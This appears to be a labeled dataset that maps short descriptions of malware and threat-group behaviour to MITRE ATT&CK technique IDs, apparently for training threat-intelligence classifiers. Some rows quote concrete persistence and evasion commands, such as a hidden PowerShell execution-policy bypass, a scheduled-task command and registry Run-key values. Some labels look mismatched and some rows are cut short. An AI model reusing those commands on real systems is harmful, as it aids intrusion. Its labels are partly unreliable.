text1	labels
can download files to the victim’s machine and execute them.	['T1105']
can dump active logon session password hashes from the lsass process.	['T1003']
can dump Windows password hashes.	['T1003']
can dump Windows password hashes and LSA secrets.	['T1003']
can encrypt C2 data with a custom technique using MD5, base64-encoding, and RC4.	['T1573']
can execute commands via an interactive command shell.	['T1059']
can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.	['T1082']
can gather hashed passwords by dumping SAM/SECURITY hive and gathers domain controller hashes from NTDS.	['T1003']
can gather the victim OS version and whether it is 64 or 32 bit.	['T1082']
can gather very specific information about attached USB devices, to include device instance ID and drive geometry.	['T1120']
can grab a system’s information including the OS version, architecture, etc.	['T1082']
can launch a remote shell to execute commands on the victim’s machine.	['T1059']
can launch PowerShell Scripts.	['T1059.001']
can list all running processes.	['T1057']
can list file and directory information.	['T1083']
can list running processes.	['T1057']
can obtain a list of all files and directories as well as logical drives.	['T1083']
can obtain information about the OS, processor, and BIOS.	['T1082']
can obtain information about the victim computer name, physical memory, country, and date.	['T1082']
can obtain information about the victim usernames.	['T1033']
can obtain system information such as OS version and disk space.	['T1082']
can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.	['T1082']
can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.	['T1082']
can obtain the victim username and permissions.	['T1033']
can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.	['T1185']
can perform screen capturing.	['T1113']
can ping or traceroute a remote host.	['T1018']
can query shared drives on the local system.	['T1135']
can record sound with the microphone.	['T1123']
can retrieve screenshots from compromised hosts.	['T1113']
can securely delete files, including deleting itself from the victim.	['T1070.004']
can send process listings over the C2 channel.	['T1057']
can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.	['T1041']
can upload and download files to the victim’s machine.	['T1105']
can upload files from the victim's machine to its C2 server.	['T1041']
can use public cloud-based storage providers for command and control.	['T1102']
can walk through directories and recursively search for strings in files.	['T1083']
can wipe files indicated by the attacker and remove itself from disk using a batch file.	['T1070.004']
checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.	['T1082']
checks the system for certain Registry keys.	['T1012']
checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.	['T1082']
"checks to see if the system is configured with ""Daylight"" time and checks for a specific region to be set for the timezone."	['T1124']
collected and exfiltrated files from the infected system.	['T1005']
collects address book information from Outlook.	['T1114']
collects a list of accounts with the command net users.	['T1087']
collects and sends system information to its C2.	['T1082']
collects credentials from Internet Explorer, Mozilla Firefox, Eudora, and several email clients.	['T1003']
collects current and parent process IDs.	['T1057']
collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.	['T1074']
collects screenshots of the victim machine.	['T1113']
collects the network adapter information.	['T1016']
collects the network adapter information and domain/username information based on current remote sessions.	['T1016']
collects the victim's %TEMP% directory path and version of Internet Explorer.	['T1083']
collects the victim hostname, window resolution, and Microsoft Windows version.	['T1082']
collects the victim’s username.	['T1033']
command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.	['T1573']
Commands such as net use and net session can be used in  to gather information about network connections from a particular host.	['T1049']
communicates over raw TCP.	['T1095']
communicates to servers operated by Google using the Jabber/XMPP protocol.	['T1102']
communicates with its C2 server over port 443.	['T1043']
compressed data into .zip files prior to exfiltrating it.	['T1560']
connects to external C2 infrastructure and opens a backdoor over port 443.	['T1043']
connects to external C2 infrastructure over port 443.	['T1043']
contains a custom keylogger.	['T1056']
contains a keylogger.	['T1056']
contains code to compress files.	['T1560']
"contains several references to football (including ""football,"" ""score,"" ""ball,"" and ""loose"") in a likely attempt to disguise its traffic."	['T1036']
contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.	['T1070.004']
contains the getProcessList function to run ps aux to get running processes.	['T1057']
copies and exfiltrates the clipboard contents every 30 seconds.	['T1115']
"copies files with certain extensions from USB devices to
a predefined directory."	['T1025']
copies itself into a running Internet Explorer process to evade detection.	['T1055']
copies itself over network shares to move laterally on a victim network.	['T1021.002']
created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.	['T1136']
created several .LNK files on the victim's machine.	['T1547.009']
creates a backdoor through which remote attackers can change C2 servers.	['T1008']
creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.	['T1083']
creates a backdoor through which remote attackers can clear all system event logs.	['T1070']
creates a backdoor through which remote attackers can download files.	['T1105']
creates a backdoor through which remote attackers can retrieve system information.	['T1082']
creates a new service named WmiApSrvEx to establish persistence.	['T1543.003']
creates a new service to establish.	['T1543.003']
creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.	['T1543.003']
creates a Registry start-up entry to establish persistence.	['T1547.001']
creates a scheduled task to ensure it is re-executed everyday.	['T1053.005']
creates run key Registry entries pointing to a malicious executable dropped to disk.	['T1547.001']
creates three Registry keys to establish persistence by adding a .	['T1112']
decoded base64-encoded PowerShell commands using a VBS file.	['T1140']
default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.	['T1573']
deletes any temporary files it creates	['T1070.004']
deletes its dropper and VBS scripts from the victim’s machine.	['T1070.004']
deletes its original installer file once installation is complete.	['T1070.004']
deletes its RAT installer file as it executes its DLL payload file.	['T1070.004']
deletes the .LNK file from the startup directory as well as the dropper components.	['T1070.004']
delivers malware using spearphishing emails with malicious HWP attachments.	['T1598.002']
deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.	['T1040']
downloads its backdoor component from a C2 server and loads it directly into memory.	['T1105']
drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.	['T1091']
drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.	['T1091']
encodes credit card data it collected from the victim with XOR.	['T1486']
encodes data in hexadecimal format over the C2 channel.	['T1132']
encrypted the collected files' path with AES and then encoded them with base64.	['T1486']
encrypts C2 data with a ROR by 3 and an XOR by 0x23.	['T1573']
encrypts C2 traffic using an XOR/ADD cipher and uses a FakeTLS method.	['T1573']
encrypts C2 traffic with a custom RC4 variant.	['T1573']
encrypts collected data with AES and Base64 and then sends it to the C2 server.	['T1486']
encrypts collected data with an incremental XOR key prior to exfiltration.	['T1486']
encrypts data with a substitute cipher prior to exfiltration.	['T1486']
encrypts files with XOR before sending them back to the C2 server.	['T1486']
enumerates all running services.	['T1007']
establishes a backdoor over HTTP.	['T1071']
establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“.	['T1053.005']
establishes persistence via a Registry Run key.	['T1547.001']
executed  by using rundll32 commands such as rundll32.exe “C:\Windows\twain_64.dll”.  also executed a .dll for a first stage dropper using rundll32.exe. An  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.	['T1218.011']
executes code using HTTP POST commands.	['T1071']
executes the whoami on the victim’s machine.	['T1033']
exfiltrates collected files automatically over FTP to remote servers.	['T1020']
exfiltrates collected files via removable media from air-gapped victims.	['T1052']
exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.	['T1210']
exploits CVE-2016-4117 to allow an executable to gain escalated privileges.	['T1068']
extracted documents and bundled them into a RAR archive.	['T1560']
extracted Word documents from a file server on a victim network.	['T1039']
gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry.  has searched for given file types.	['T1083']
gathers a list of processes using the tasklist command and then is sent back to the control server.	['T1057']
gathers informatin on the IP forwarding table, MAC address, and network SSID.	['T1016']
gathers network configuration information as well as the ARP cache.	['T1016']
grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.	['T1134']
has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.	['T1106']
has a command to search for files on the victim’s machine.	['T1083']
has a command to timestop a file or directory.	['T1070.006']
has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.	['T1105']
has a function to delete files from the victim’s machine.	['T1070.004']
has been delivered via Word documents using DDE for execution.	['T1559.002']
has been known to employ binary padding.	['T1027.001']
has been known to establish persistence by adding programs to the Run Registry key.	['T1547.001']
has been seen loaded into msiexec.exe through process hollowing to hide its execution.	['T1055.012']
has collected .PST archives.	['T1114']
has commands to get information about the victim's name, build, version, serial number, and memory usage.	['T1082']
has commands to list drives on the victim machine and to list file information for a given directory.	['T1083']
has executed malicious .bat files containing PowerShell commands.	['T1064']
has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.	['T1562.001']
has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.	['T1036']
has injected code into trusted processes.	['T1055']
has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.	['T1070.004']
has modules that are capable of capturing from a victim's webcam.	['T1125']
has retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.	['T1001']
has run tasklist on a victim's machine.	['T1057']
has sent emails containing malicious attachments or links that require users to execute a file or macro to infect the victim machine.	['T1204']
has sent emails with URLs pointing to malicious documents.	['T1598.003']
has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.	['T1598.003']
has several commands to delete files associated with the malware from the victim.	['T1070.004']
has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”	['T1553.002']
has signed  payloads with legally purchased code signing certificates.  has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.	['T1553.002']
has stored captured credential information in a file named pi.log.	['T1074']
has the ability to change firewall settings to allow a plug-in to be downloaded.	['T1562.001']
has the ability to initiate keylogging.	['T1056']
has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.	['T1082']
has the capability to collect the current logged on user’s username from a machine.	['T1033']
has the capability to delete files and scripts from the victim's machine.	['T1070.004']
has the capability to download and execute .exe files.	['T1105']
has the capability to execute commands using cmd.exe.	['T1059']
has the capability to gather NTLM password information.	['T1003']
has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.	['T1008']
has used a CHM payload to load and execute another malicious file once delivered to a victim.	['T1218.001']
has used a custom executable to execute PowerShell scripts.	['T1059.001']
has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.	['T1003']
has used a script to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.	['T1119']
has used command line during its intrusions.	['T1059']
has used CVE-2014-4076, CVE-2015-2387, and CVE-2015-1701 to escalate privileges.	['T1068']
has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.	['T1134']
has used environment variables and standard input (stdin) to obfuscate command-line arguments.  also obfuscates malicious macros delivered as payloads.	['T1027']
has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.	['T1203']
has used forged Microsoft code-signing certificates on malware.	['T1553.002']
has used hidden or non-printing characters to help masquerade file names on a system, such as appending a Unicode no-break space character to a legitimate service name.	['T1036']
has used HTTP and DNS for C2. The group has also used the Plink utility and other tools to create tunnels to C2 servers.	['T1071']
has used HTTPS and DNS tunneling for C2. The group has also used the Plink utility to create SSH tunnels.	['T1071']
has used keyloggers.	['T1056']
has used legitimate credentials to maintain access to a victim network and exfiltrate data. The group also used credentials stolen through a spearphishing email to login to the DCCC network.	['T1078']
has used legitimate local admin account credentials.	['T1078']
has used Metasploit’s  NTDSGRAB module to obtain a copy of the victim's Active Directory database.	['T1087']
has used net user /domain to identify account information.	['T1087']
has used pass the hash for lateral movement.	['T1550.002']
has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.	['T1216']
has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and PoS malware known as TRINITY.	['T1053.005']
has used scheduled tasks to maintain RDP backdoors.	['T1053.005']
has used stolen code signing certificates used to sign malware.	['T1553.002']
has used tcping.exe, similar to , to probe port status on systems of interest.	['T1046']
has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.	['T1095']
has used the net view command.	['T1018']
has used  to generate Kerberos golden tickets.	['T1550.003']
has used UPX to pack	['T1027.002']
has used WinRM to enable remote execution.	['T1021.006']
If a victim meets certain criteria,  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs – %APPDATA%\Intel\ResN32.dll and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs – 0x1.	['T1546.010']
If establishing persistence by installation as a new service fails, one variant of  establishes persistence for the created .exe file by setting the following Registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe. Other variants have set the following Registry key for persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self].	['T1547.001']
injects itself into explorer.exe.	['T1055']
injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.	['T1055']
installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.	['T1036']
Install-SSP Persistence module can be used to establish by installing a SSP DLL.	['T1547.005']
is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.	['T1542.003']
is a Web shell.	['T1505.003']
is capable of deleting the backdoor file.	['T1070.004']
is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.	['T1083']
is capable of manipulating the Registry.	['T1112']
is capable of performing audio captures.	['T1123']
is capable of persisting via a .lnk file stored in the Startup directory.	['T1547.009']
is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.	['T1083']
is capable of running WMI queries.	['T1047']
is capable of setting and deleting Registry values.	['T1112']
is capable of stealing usernames and passwords from browsers on the victim machine.	['T1003']
is capable of taking screen captures.	['T1113']
is capable of tunneling though a proxy.	['T1090']
is likely loaded via DLL hijacking into a legitimate McAfee binary.	['T1574.001']
is obscured using XOR encoding and appended to a valid GIF file.	['T1027']
leveraged  to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.	['T1003']
leverages  and  to steal credentials.	['T1003']
leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.	['T1106']
lists files on the victim’s machine.	['T1083']
lists the current running processes on the system.	['T1057']
lists the system’s processes.	['T1057']
logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.	['T1027']
main method of communicating with its C2 servers is using HTTP or HTTPS.	['T1071']
malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.	['T1547.001']
malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.	['T1562.001']
malware can leverage the Windows API call, CreateProcessA(), for execution.	['T1106']
malware can take a screenshot and upload the file to its C2 server.	['T1113']
malware contains a secondary fallback command and control server that is contacted after the primary command and control server.	['T1008']
malware gathers a list of running processes.	['T1057']
malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.	['T1547.001']
malware has used .vbs scripts for execution.	['T1064']
malware KiloAlfa contains keylogging functionality.	['T1056']
malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.	['T1008']
malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.	['T1047']
malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.	['T1542.003']
marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.	['T1070.004']
may collect information about the currently logged in user by running whoami on a victim.	['T1033']
may create the file %HOMEPATH%\Start Menu\Programs\Startup\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.	['T1547.009']
may use ipconfig /all to gather system network configuration details.	['T1016']
mimics filenames from %SYSTEM%\System32 to hide DLLs in %WINDIR% and/or %TEMP%.	['T1036']
modifies the firewall Registry key SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List.	['T1112']
network traffic can communicate over HTTP.	['T1071']
network traffic communicates over a raw socket.	['T1095']
network traffic is Base64-encoded plaintext.	['T1132']
New-UserPersistenceOption Persistence argument can be used to establish via a .	['T1053.005']
New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Registry key.	['T1547.001']
obfuscates API function names using a substitute cipher combined with Base64 encoding.	['T1027']
obtains the victim username and saves it to a file.	['T1033']
Once  gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.	['T1199']
opens cmd.exe on the victim.	['T1059']
overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.	['T1055.011']
Part of 's operation involved using  modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.	['T1092']
performs checks for various antivirus and security products during installation.	['T1518.001']
performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.	['T1003']
performs discovery of permission groups net group /domain.	['T1069']
performs process discovery using tasklist commands.	['T1057']
primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.	['T1008']
provides a reverse shell connection on 8338/TCP, encrypted via AES.	['T1573', 'T1059', 'T1095']
queries Registry values as part of its anti-sandbox checks.	['T1012']
queries the registry to look for information about Terminal Services.	['T1012']
queries the system to identify existing services.	['T1007']
Recent versions of  delete files and registry keys created by the malware.	['T1070.004']
recursively searches through directories for files.	['T1083']
removes all files in the /tmp directory.	['T1070.004']
retrieves additional malicious payloads from the C2 server.	['T1105']
saves system information into an XML file that is then XOR-encoded.	['T1486']
scanned network services to search for vulnerabilities in the victim system.	['T1046']
schedules tasks to invoke its components in order to establish persistence.	['T1053.005']
searches for administrator accounts on both the local victim machine and the network.	['T1087']
searches for removable media and duplicates itself onto it.	['T1091']
searches for specified files.	['T1083']
sends the logged-on username to its hard-coded C2.	['T1033']
sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.	['T1598.002']
sets its DLL file as a new service in the Registry to establish persistence.	['T1543.003']
Several  malware families install themselves as new services on victims.	['T1543.003']
Several tools used by  have been command-line driven.	['T1059']
Some  components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.	['T1102']
Some data in  is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.	['T1027']
Some  DLL files have been packed with UPX.	['T1027.002']
Some  samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.	['T1001']
Some  variants create a new Windows service to establish persistence.	['T1543.003']
Some  variants install .dll files as services with names generated by a list of hard-coded strings.	['T1543.003']
Some variants of the  Trojan have been known to store data in Extended Attributes.	['T1564.004']
Some variants of  use RC4 to encrypt C2 traffic.	['T1573']
stages the output from command execution and collected files in specific folders before exfiltration.	['T1074']
stores the gathered data from the machine in .db files and .bmp files under four separate locations.	['T1074']
surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.	['T1007']
"The ""ZJ"" variant of  allows ""ZJ link"" infections with Internet access to relay traffic from ""ZJ listen"" to a command server."	['T1090']
The discovery modules used with  can collect information on open windows.	['T1010']
The  group is known to have used pass the hash.	['T1550.002']
The main  dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit. Newer versions of  will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.	['T1518.001']
The  malware platform supports many standard protocols, including HTTP, HTTPS, and SMB.	['T1071']
The net start and net stop commands can be used in  to execute or stop Windows services.	['T1569.002']
The net start command can be used in  to find information about Windows services.	['T1007']
The net use \\system\share /delete command can be used in  to remove an established connection to a network share.	['T1070.005']
The net view \\remotesystem and net share commands in  can be used to find shared drives and directories on remote and local systems respectively.	['T1135']
The original variant of  encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation.  has also included HTML code in C2 traffic in an apparent attempt to evade detection. Additionally, some variants of  use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.	['T1573']
The PowerShell script with the  payload was obfuscated using the COMPRESS technique in Invoke-Obfuscation.	['T1027']
The  trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist.	['T1543.001']
To assist in establishing persistence,  creates %APPDATA%\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\OneDrive.ps1”.	['T1064']
took screen shots using their Windows malware.	['T1113']
typically loads its DLL file into a legitimate signed Java or VMware executable.	['T1574.002']
uploads and downloads files to and from the victim’s machine.	['T1105']
used a .NET tool to dump data from Microsoft Exchange mailboxes.	['T1114']
used a batch script to gather folder and file names from victim hosts.	['T1083']
used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.	['T1560', 'T1119']
used a tool called BruteForcer to perform a brute force attack.	['T1110']
used a tool called Imecab to set up a persistent remote access account on the victim machine.	['T1108', 'T1136']
used Kerberos ticket attacks for lateral movement.	['T1550.002']
used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.	['T1078']
used named and hijacked scheduled tasks to establish persistence.	['T1053.005']
used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.  has also used a machine to relay and obscure communications between  and their server.	['T1090']
used PowerShell commands to execute payloads.	['T1059.001']
used SMB for C2.	['T1071']
used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.	['T1043']
used stolen certificates to sign its malware.	['T1553.002']
used the command query user on victim hosts.	['T1033']
used the Plink utility and other tools to create tunnels to C2 servers.	['T1573']
used Visual Basic Scripts (VBS), JavaScript code, batch files, and .SCT files on victim machines.	['T1064']
used WMI to steal credentials and execute backdoors at a future time.	['T1047']
uses a batch file to delete itself.	['T1064']
uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.	['T1548.002']
uses a Launch Agent to persist.	['T1543.001']
uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.	['T1027']
uses an encrypted file to store commands and configuration values.	['T1140']
uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.	['T1546.003']
uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.	['T1092']
uses batch scripts for various purposes, including to restart and uninstall itself.	['T1064']
uses cmd.exe to execute commands.	['T1059']
uses command-line interaction to search files and directories.	['T1083']
uses HTTPS to conceal C2 communications.	['T1071']
uses launchctl to enable screen sharing on the victim’s machine.	['T1569.001']
uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.	['T1033']
uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.	['T1027']
uses port 443 for the control server communications.	['T1043']
uses port 52100 and 5876 for C2 communications.	['T1571']
uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.	['T1043']
uses PowerShell for execution as well as PowerShell Empire to establish persistence.	['T1059.001']
uses Python for scripting to execute additional commands.	['T1064']
uses rundll32.exe in a Registry value added to establish persistence.	['T1218.011']
uses rundll32.exe to load.	['T1218.011']
uses the netstat command to find open ports on the victim’s machine.	['T1049']
uses the net view command for discovery.	['T1018']
uses the zip -r command to compress the data collected on the local system.	['T1560']
uses token manipulation with NtFilterToken as part of UAC bypass.	['T1134']
uses Tor for command and control.	['T1090.003']
uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.	['T1102']
"uses Windows services typically named ""javamtsup"" for persistence."	['T1543.003']
uses WinRAR to compress data that is intended to be exfiltrated.	['T1560']
Various  malware modifies the Windows firewall to allow incoming connections or disable it entirely using .  malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally,  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.	['T1562.001']
will look for the current IP address.	['T1016']
What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF	['T1189']
Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets	['T1189']
This is followed by a number of Linux shell command style commands related to the malware establishing persistence	['T1059']
Tracked Commands During observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline	['T1059']
The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4	['T1059']
Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output	['T1059']
For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands	['T1059']
The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\tmpCa.vbs	['T1059']
